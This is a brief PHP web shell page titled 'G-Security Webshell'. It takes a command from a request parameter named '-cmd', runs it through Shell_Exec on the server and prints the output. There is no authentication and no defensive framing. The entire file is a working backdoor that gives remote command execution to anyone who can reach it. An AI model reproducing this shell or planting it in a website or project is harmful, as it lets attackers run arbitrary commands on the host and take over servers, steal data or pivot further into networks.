<html>
<head>
<title>G-Security Webshell</title>
</head>

<body bgcolor=#000000 text=#ffffff ">
<form method=POST>
<br>
<input type=TEXT name="-cmd" size=64 value="<?php $cmd?>" 
style="background:#000000;color:#ffffff;">
<hr>
<pre>
<?php $cmd = $_REQUEST["-cmd"];?>
<?php if($cmd != "") print Shell_Exec($cmd);?>
</pre>
</form>
</body>
</html
